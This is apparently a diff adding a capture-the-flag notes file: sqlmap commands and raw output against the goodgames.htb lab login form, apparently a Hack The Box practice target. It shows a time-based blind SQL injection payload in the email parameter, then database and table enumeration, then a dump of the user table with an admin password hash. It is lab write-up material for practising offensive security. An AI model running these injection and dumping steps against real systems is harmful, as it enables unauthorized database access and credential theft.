@@ -1,0 +1,52 @@
+sqlmap -r login.req --batch --dbs
+sqlmap identified the following injection point(s) with a total of 153 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=admin@goodgames.htb' AND (SELECT 5498 FROM (SELECT(!SLEEP(5)))wroh) AND 'Oees'='Oees&password=password
+---
+[08:14:01] [INFO] the back-end DBMS is MySQL
+[08:14:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+back-end DBMS: MySQL >= 5.0.12
+[08:14:07] [INFO] fetching database names
+[08:14:07] [INFO] fetching number of databases
+[08:14:07] [INFO] retrieved: 
+[08:14:18] [INFO] adjusting time delay to 4 seconds due to good response times
+2
+[08:14:19] [INFO] retrieved: information_schema
+[08:18:45] [INFO] retrieved: main
+available databases [2]:
+[*] information_schema
+[*] main
+
+sqlmap -r login.req --batch -D main --tables
+
+sqlmap identified the following injection point(s) with a total of 153 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=admin@goodgames.htb' AND (SELECT 5498 FROM (SELECT(!SLEEP(5)))wroh) AND 'Oees'='Oees&password=password
+---
+
+Database: main
+[3 tables]
++---------------+
+| user          |
+| blog          |
+| blog_comments |
++---------------+
+
+sqlmap -r login.req --batch -D main -T user --dump
+
+Database: main
+Table: user
+[1 entry]
++----+---------------------+--------+----------------------------------+
+| id | email               | name   | password                         |
++----+---------------------+--------+----------------------------------+
+| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
++----+---------------------+--------+----------------------------------+
+
